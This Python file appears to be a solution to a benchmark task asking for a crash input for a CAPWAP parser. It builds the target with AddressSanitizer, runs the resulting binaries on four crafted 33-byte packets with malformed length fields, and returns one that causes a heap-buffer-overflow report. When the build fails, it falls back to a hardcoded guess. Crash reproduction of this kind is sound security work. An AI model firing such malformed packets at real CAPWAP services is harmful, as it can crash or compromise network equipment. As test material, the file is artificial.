import os
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the extracted source directory
            src_root = None
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    src_root = item_path
                    break
            
            if not src_root:
                raise ValueError("Could not find source directory")
            
            # Build the vulnerable program
            build_dir = os.path.join(tmpdir, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            # Look for build files (common patterns)
            configure_files = ["configure", "CMakeLists.txt", "Makefile", "autogen.sh"]
            found_config = None
            for root, dirs, files in os.walk(src_root):
                for file in files:
                    if file in configure_files:
                        found_config = os.path.join(root, file)
                        break
                if found_config:
                    break
            
            # Try to build with common approaches
            build_success = False
            original_dir = os.getcwd()
            
            try:
                os.chdir(build_dir)
                
                # Try CMake if CMakeLists.txt exists
                cmake_lists = None
                for root, dirs, files in os.walk(src_root):
                    if "CMakeLists.txt" in files:
                        cmake_lists = os.path.join(root, "CMakeLists.txt")
                        break
                
                if cmake_lists:
                    # Run cmake with address sanitizer
                    result = subprocess.run(
                        ["cmake", src_root, "-DCMAKE_C_FLAGS=-fsanitize=address -fno-omit-frame-pointer -g -O0"],
                        capture_output=True,
                        text=True
                    )
                    if result.returncode == 0:
                        result = subprocess.run(
                            ["make", "-j8"],
                            capture_output=True,
                            text=True
                        )
                        build_success = result.returncode == 0
                
                # If CMake failed or not found, try autotools
                if not build_success:
                    os.chdir(src_root)
                    
                    # Check for autogen.sh or configure
                    if os.path.exists("./autogen.sh"):
                        subprocess.run(["./autogen.sh"], capture_output=True, text=True)
                    
                    if os.path.exists("./configure"):
                        # Configure with address sanitizer
                        result = subprocess.run(
                            ["./configure", "CFLAGS=-fsanitize=address -fno-omit-frame-pointer -g -O0"],
                            capture_output=True,
                            text=True
                        )
                        if result.returncode == 0:
                            result = subprocess.run(
                                ["make", "-j8"],
                                capture_output=True,
                                text=True
                            )
                            build_success = result.returncode == 0
                
                # If still not built, look for simple Makefile
                if not build_success:
                    os.chdir(src_root)
                    if os.path.exists("Makefile"):
                        # Try to build with ASAN flags
                        env = os.environ.copy()
                        env["CFLAGS"] = "-fsanitize=address -fno-omit-frame-pointer -g -O0"
                        result = subprocess.run(
                            ["make", "-j8"],
                            env=env,
                            capture_output=True,
                            text=True
                        )
                        build_success = result.returncode == 0
                
                os.chdir(original_dir)
                
            except Exception as e:
                os.chdir(original_dir)
                build_success = False
            
            # If we couldn't build, return a heuristic PoC based on common CAPWAP overflow patterns
            # CAPWAP packets typically have headers with length fields
            if not build_success:
                # Create a PoC that would trigger common heap overflow in CAPWAP parsing
                # Common pattern: malformed length field causing buffer overflow
                poc = bytearray(33)
                
                # CAPWAP header structure (simplified):
                # Byte 0: Version (0)
                # Byte 1: Flags
                # Bytes 2-3: Length (big-endian)
                # Bytes 4-7: Wireless Binding ID
                # Bytes 8-11: Radio ID
                
                # Set version to 0
                poc[0] = 0
                
                # Set some flags
                poc[1] = 0x80  # Set some flag bits
                
                # Set length field to 0xFFFF (65535) which is much larger than actual packet
                # This might cause buffer overflow in naive implementations
                poc[2] = 0xFF  # High byte of length
                poc[3] = 0xFF  # Low byte of length
                
                # Fill rest with data that might trigger code execution or crash
                for i in range(4, 33):
                    poc[i] = 0x41  # 'A' character
                
                return bytes(poc)
            
            # If build succeeded, try to find and run the binary
            # Look for executables in build directory
            executables = []
            for root, dirs, files in os.walk(build_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    if os.access(filepath, os.X_OK):
                        # Check if it's an ELF binary (not a script)
                        try:
                            with open(filepath, 'rb') as f:
                                if f.read(4) == b'\x7fELF':
                                    executables.append(filepath)
                        except:
                            pass
            
            # Also check source root
            for root, dirs, files in os.walk(src_root):
                for file in files:
                    filepath = os.path.join(root, file)
                    if os.access(filepath, os.X_OK):
                        try:
                            with open(filepath, 'rb') as f:
                                if f.read(4) == b'\x7fELF':
                                    executables.append(filepath)
                        except:
                            pass
            
            # Try each executable with different inputs
            test_inputs = []
            
            # Generate various test patterns for heap overflow
            # 1. Simple pattern with large length field
            poc1 = bytearray(33)
            poc1[0] = 0  # Version
            poc1[1] = 0x80  # Flags
            poc1[2] = 0xFF  # Length high byte
            poc1[3] = 0xFF  # Length low byte
            for i in range(4, 33):
                poc1[i] = 0x41  # 'A'
            test_inputs.append(bytes(poc1))
            
            # 2. Pattern with null bytes
            poc2 = bytearray(33)
            poc2[0] = 0
            poc2[1] = 0x80
            poc2[2] = 0x00
            poc2[3] = 0x21  # Length = 33
            for i in range(4, 33):
                poc2[i] = 0x42  # 'B'
            test_inputs.append(bytes(poc2))
            
            # 3. Pattern with very small length but large data
            poc3 = bytearray(33)
            poc3[0] = 0
            poc3[1] = 0x80
            poc3[2] = 0x00
            poc3[3] = 0x04  # Length = 4 (smaller than actual)
            for i in range(4, 33):
                poc3[i] = 0x43  # 'C'
            test_inputs.append(bytes(poc3))
            
            # 4. Pattern that might trigger off-by-one
            poc4 = bytearray(33)
            poc4[0] = 0
            poc4[1] = 0x80
            poc4[2] = 0x00
            poc4[3] = 0x20  # Length = 32 (one less than actual)
            for i in range(4, 33):
                poc4[i] = 0x44  # 'D'
            test_inputs.append(bytes(poc4))
            
            # Test each executable with each input
            for executable in executables:
                for test_input in test_inputs:
                    try:
                        # Run with ASAN
                        env = os.environ.copy()
                        env['ASAN_OPTIONS'] = 'detect_leaks=0'
                        
                        result = subprocess.run(
                            [executable],
                            input=test_input,
                            env=env,
                            capture_output=True,
                            timeout=2
                        )
                        
                        # Check if it crashed (non-zero exit code)
                        if result.returncode != 0:
                            # Check if ASAN reported heap-buffer-overflow
                            if b'heap-buffer-overflow' in result.stderr or \
                               b'AddressSanitizer' in result.stderr or \
                               b'buffer-overflow' in result.stderr:
                                return test_input
                    except subprocess.TimeoutExpired:
                        continue
                    except Exception:
                        continue
            
            # If no crash found with existing patterns, return the first pattern
            # which is most likely to trigger heap overflow based on common vulnerabilities
            return test_inputs[0]